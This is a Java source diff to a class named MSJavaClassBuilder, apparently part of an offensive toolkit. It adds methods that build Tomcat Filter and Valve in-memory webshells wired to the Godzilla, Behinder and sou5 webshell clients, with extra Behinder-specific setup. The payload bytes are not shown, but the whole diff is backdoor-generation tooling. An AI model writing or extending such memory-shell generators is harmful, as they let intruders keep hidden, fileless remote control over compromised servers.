@@ -162,6 +162,21 @@ public class MSJavaClassBuilder {
 
     @Middleware(Middleware.Tomcat)
     @MemShell(MemShell.Filter)
+    @MemShellFunction(MemShellFunction.Godzilla)
+    public byte[] tomcatFilterGodzilla(Class cls, JavaClassHelper javaClassHelper) throws Exception {
+        return defaultOriginalMS(cls, javaClassHelper);
+    }
+
+    @Middleware(Middleware.Tomcat)
+    @MemShell(MemShell.Filter)
+    @MemShellFunction(MemShellFunction.Behinder)
+    public byte[] tomcatFilterBehinder(Class cls, JavaClassHelper javaClassHelper) throws Exception {
+        behinderMS(javaClassHelper);
+        return defaultOriginalMS(cls, javaClassHelper);
+    }
+
+    @Middleware(Middleware.Tomcat)
+    @MemShell(MemShell.Filter)
     @MemShellFunction(MemShellFunction.sou5)
     public byte[] tomcatFilterSou5(Class cls, JavaClassHelper javaClassHelper) throws Exception {
         return defaultOriginalMS(cls, javaClassHelper);
@@ -178,6 +193,28 @@ public class MSJavaClassBuilder {
     @MemShell(MemShell.Valve)
     @MemShellFunction(MemShellFunction.Exec)
     public byte[] tomcatValveExec(Class cls, JavaClassHelper javaClassHelper) throws Exception {
+        return defaultOriginalMS(cls, javaClassHelper);
+    }
+
+    @Middleware(Middleware.Tomcat)
+    @MemShell(MemShell.Valve)
+    @MemShellFunction(MemShellFunction.Godzilla)
+    public byte[] tomcatValveGodzilla(Class cls, JavaClassHelper javaClassHelper) throws Exception {
+        return defaultOriginalMS(cls, javaClassHelper);
+    }
+
+    @Middleware(Middleware.Tomcat)
+    @MemShell(MemShell.Valve)
+    @MemShellFunction(MemShellFunction.Behinder)
+    public byte[] tomcatValveBehinder(Class cls, JavaClassHelper javaClassHelper) throws Exception {
+        behinderMS(javaClassHelper);
+        return defaultOriginalMS(cls, javaClassHelper);
+    }
+
+    @Middleware(Middleware.Tomcat)
+    @MemShell(MemShell.Valve)
+    @MemShellFunction(MemShellFunction.sou5)
+    public byte[] tomcatValveSou5(Class cls, JavaClassHelper javaClassHelper) throws Exception {
         return defaultOriginalMS(cls, javaClassHelper);
     }
 
